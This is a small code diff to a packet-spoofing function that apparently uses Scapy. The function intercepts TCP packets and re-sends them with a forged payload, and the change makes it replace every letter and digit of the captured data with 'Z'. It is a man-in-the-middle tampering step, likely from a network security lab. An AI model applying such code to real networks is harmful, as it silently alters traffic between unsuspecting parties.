@@ -13,7 +13,7 @@ def spoof_pkt(pkt):
         ##############################################
         if pkt[TCP].payload:
             data=pkt[TCP].payload.load
-            newdata='Z'
+            newdata=re.sub(r'[0-9a-zA-Z]', r'Z', data.decode())
             send(newpkt/newdata)
         else:
             send(newpkt)
